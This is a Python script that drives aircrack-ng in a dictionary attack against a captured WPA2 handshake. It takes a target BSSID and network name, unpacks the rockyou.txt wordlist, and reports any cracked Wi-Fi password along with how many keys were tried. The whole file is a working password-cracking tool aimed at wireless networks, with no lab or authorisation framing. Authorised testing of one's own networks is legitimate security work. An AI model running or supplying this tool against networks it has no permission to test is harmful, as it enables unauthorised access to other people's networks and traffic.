import subprocess
import sys
import os
import gzip
import shutil
import time
import re

from rich import print
from pyfiglet import figlet_format

print(f"[bold green]{figlet_format('CRACK')}[/bold green]")

WORDLIST_FOLDER = "wordlist"
WORDLIST_TXT = os.path.join(WORDLIST_FOLDER, "rockyou.txt")
WORDLIST_GZ = os.path.join(WORDLIST_FOLDER, "rockyou.txt.gz")

MAX_CRACK_SECONDS = 180


def prepare_wordlist():
    if os.path.exists(WORDLIST_TXT):
        return WORDLIST_TXT

    if not os.path.exists(WORDLIST_GZ):
        print("[red]Wordlist not found.[/red]")
        print(f"[yellow]Expected:[/yellow] {WORDLIST_GZ}")
        return None

    print("[cyan]Extracting rockyou.txt.gz...[/cyan]")

    with gzip.open(WORDLIST_GZ, "rb") as compressed_file:
        with open(WORDLIST_TXT, "wb") as extracted_file:
            shutil.copyfileobj(compressed_file, extracted_file)

    print(f"[green]Wordlist ready:[/green] {WORDLIST_TXT}")
    return WORDLIST_TXT


def format_time(seconds):
    seconds = int(seconds)
    minutes = seconds // 60
    remaining_seconds = seconds % 60

    if minutes == 0:
        return f"{remaining_seconds} seconds"

    return f"{minutes} minutes {remaining_seconds} seconds"


def show_crack_summary(output, elapsed_time):
    key_match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", output)
    tested_matches = re.findall(r"(\d+)\s*/\s*(\d+)\s+keys tested", output)

    print("\n[bold yellow]Crack Summary:[/bold yellow]")

    if key_match:
        password = key_match.group(1)

        print(f"[green]Password Found:[/green] {password}")
    else:
        print("[red]Password Found:[/red] No")

    print(f"[cyan]Time Taken:[/cyan] {format_time(elapsed_time)}")

    if tested_matches:
        tested, total = tested_matches[-1]
        tested = int(tested)
        total = int(total)

        percent = (tested / total) * 100

        print(f"[cyan]Passwords Tried:[/cyan] {tested}")
        print(f"[cyan]Total Wordlist Size:[/cyan] {total}")
        print(f"[cyan]Wordlist Checked:[/cyan] {percent:.4f}%")
    else:
        print("[yellow]Passwords Tried:[/yellow] Could not read from aircrack-ng output.")


if len(sys.argv) >= 4:
    cap_file = sys.argv[1]
    target_bssid = sys.argv[2]
    target_name = sys.argv[3]
else:
    cap_file = input("Capture file path: ").strip()
    target_bssid = input("Target BSSID: ").strip()
    target_name = input("Target Name: ").strip()


print(f"[green]Target Name:[/green] {target_name}")
print(f"[green]Target BSSID:[/green] {target_bssid}")
print(f"[green]Capture File:[/green] {cap_file}")

if not os.path.exists(cap_file):
    print("[red]Capture file not found.[/red]")
    exit()

wordlist = prepare_wordlist()

if wordlist is None:
    exit()


print(f"\n[cyan]Starting password cracking, max time {MAX_CRACK_SECONDS} seconds...[/cyan]\n")

start_time = time.time()

try:
    result = subprocess.run(
        [
            "aircrack-ng",
            "-a2",
            "-b",
            target_bssid,
            "-w",
            wordlist,
            cap_file
        ],
        capture_output=True,
        text=True,
        timeout=MAX_CRACK_SECONDS
    )

    elapsed_time = time.time() - start_time
    output = result.stdout + result.stderr

    print(output)

    print("\n[green]Cracking process finished.[/green]")
    show_crack_summary(output, elapsed_time)

except subprocess.TimeoutExpired as error:
    elapsed_time = time.time() - start_time

    output = ""

    if error.stdout:
        output += error.stdout

    if error.stderr:
        output += error.stderr

    print(output)

    print("\n[red]Cracking stopped.[/red]")
    print("[yellow]No password found within 3 minutes.[/yellow]")
    print("[yellow]This password is probably too hard for this laptop or not in the wordlist.[/yellow]")
    print(f"[cyan]Time Spent:[/cyan] {format_time(elapsed_time)}")

    tested_matches = re.findall(r"(\d+)\s*/\s*(\d+)\s+keys tested", output)

    if tested_matches:
        tested, total = tested_matches[-1]
        print(f"[cyan]Passwords Tried Before Stop:[/cyan] {tested}")
        print(f"[cyan]Total Wordlist Size:[/cyan] {total}")
